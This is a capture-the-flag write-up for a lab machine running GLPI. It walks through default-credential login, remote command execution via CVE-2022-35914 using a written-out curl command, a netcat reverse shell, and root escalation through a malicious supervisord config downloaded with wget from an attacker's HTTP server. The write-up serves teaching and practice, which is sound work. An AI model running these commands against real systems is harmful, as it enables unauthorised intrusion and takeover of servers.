# Flawed machine from brCTF

## Information Gathering/Reconnaissance
As is customary, we initiate our preferred network scanning tool, Nmap, to conduct initial reconnaissance. Our scan reveals that port 80, which is typically associated with HTTP and port 22, are accessible. <br>
`nmap -sC -sV -oN flawed.nmap 10.0.160.157`
```
Nmap scan report for 10.0.160.157
Host is up (0.23s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Authentication - GLPI
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

In the second phase of our reconnaissance, we proceed to examine the application hosted on port 80 by accessing it through our web browser. To our surprise, we are welcomed with a login page. Quite intriguing!
![GLPI Login](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/flawed/images/glpi-login.png "a title")

After a brief research on google we discovered default credentials for GLPI which we can try on out target.
![google glpi logins](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/flawed/images/glpi-default-creds.png "a title")

### Exploitation
We now attempt to login to GLPI and viola!!<br>
From there we move on with out recon and attempt to find the version of GLPI running. Hopefully we can find publicly available exploits.
![glpi logged in](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/flawed/images/checking-glpi-version.png "a title")
The version of GLPI can be seen in the photo below.
![glpi version enum](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/flawed/images/glpi-version.png "a title")

Now that we know the version running, we can google it to find avaiable exploits and shortly after, we find one on github from [Orange-CyberDefense](https://github.com/Orange-Cyberdefense/CVE-repository/blob/master/PoCs/POC_2022-35914.sh)

**CURL Command to exploit the vulnerability** <br>
```curl -s -d 'sid=foo&hhook=exec&text=[command]' -b 'sid=foo' http://[target-ip]/vendor/htmlawed/htmlawed/htmLawedTest.php |egrep '\&nbsp; \[[0-9]+\] =\&gt;'| sed -E 's/\&nbsp; \[[0-9]+\] =\&gt; (.*)<br \/>/\1/'```

Replace [command] and [target] with the command you  want to execute on the target and the IP address of the target respecfully.

We modify the exploit to get a reverse shell on out netcat listener.<br>
Firstly, we must make sure we are listening for incoming connections. <br>
![netcat listening](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/flawed/images/start-netcat-listener.png "a title")

Secondly, we prepare our exploit code to obtain a reverse shell.<br>
![preparing payload](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/flawed/images/modify-exploit.png "a title")

We execute the command and boom!! we get a connection on our listener. <br>
![conn reccv](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/flawed/images/nc-connection-received.png "a title")

## Post Exploitation
As usual we need to stabilize out shell and the steps are as follows:<br>
#### Shell stabilization
Execute on target
1. Step 1: `python3 -c "import pty;pty.spawn('/bin/bash')"` <br>
2. Step 2: `export TERM=xterm-color` <br>
3. Step 3: `CTRL+z`<br>
On host machine.
4. Step 4: `stty raw -echo; fg` <br>
5. Step 5: `reset` <br>

Let's continue from when we left off. Let's check the sudo privileges the `ETSCTF` user has on the box.
![sudo privs](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/flawed/images/check-sudo-privs.png "a title")

Hmmmm, interesting..... Can we abuse this? <br>
After doing some research we find out that: <br>
Supervisord is a `process control system` for Unix-like operating systems. It allows you to manage and monitor multiple processes, ensuring that they run continuously and `automatically restarting` them if they fail. Supervisord is often used to manage services, daemons, and other long-running processes.

Supervisord can run commands in it's configuration file. Now you get the hint from here? So what we'll have to do is to craft a configuration file for supervisord which contains commands to execute.<br>
We will take advantage of this to spawn a shell.<br>
![sudo privs](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/flawed/images/spawn-nc-shell-priv.png "a title")

Before anything else let's start our listener<br>
![other nc listener](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/flawed/images/other-nc-listener.png "a title")

Now we have to transfer our malicious configuration to the target. To make that possible we must start our local python http server in the directory containing out malicious configuration. <br>
`python3 -m http.server 8000` <br>
![python http server](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/flawed/images/start-python-http-server.png "a title")

Downloading the malicious configuation from our python http server.<br>
NB: make sure you have write privileges to the current diretory you are in. You can use the `/tmp` since it has very loose permissions.<br>
`wget http://<server.ip>:<port>/test.conf`
![python http server](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/flawed/images/downloading-mal-conf-file.png "a title")

Right after downloading the file we transfer it the the `/var/tmp` direcrory. This is necessary because it is the only folder that we can execute configuration files from.<br>
![copy to var-tmp](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/flawed/images/copy-payload-to-tmp.png "a title")

Now we can run our command with sudo to gain root privileges.<br>
![run pe vector](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/flawed/images/run-pe-vector.png "a title")

Viola!! we are root. :smiley: 
![i am root](https://raw.githubusercontent.com/theMcSam/brCTF-writeups/main/flawed/images/iamroot_and_got_conn.png "a title")